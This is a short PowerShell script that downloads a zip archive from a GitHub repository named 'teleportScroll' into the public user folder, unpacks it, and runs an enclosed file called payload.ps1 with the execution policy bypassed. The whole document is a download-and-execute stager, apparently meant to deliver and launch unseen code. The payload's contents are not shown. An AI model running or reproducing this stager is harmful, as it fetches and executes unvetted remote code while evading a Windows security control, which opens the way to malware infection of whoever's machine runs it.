Invoke-WebRequest -Uri 'https://github.com/kenawhy/teleportScroll/archive/refs/heads/main.zip' -OutFile 'C:\Users\Public\teleportScroll.zip'
Expand-Archive -Path 'C:\Users\Public\teleportScroll.zip' -DestinationPath 'C:\Users\Public\teleportScroll'
Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File C:\Users\Public\teleportScroll\teleportScroll-main\payload.ps1'
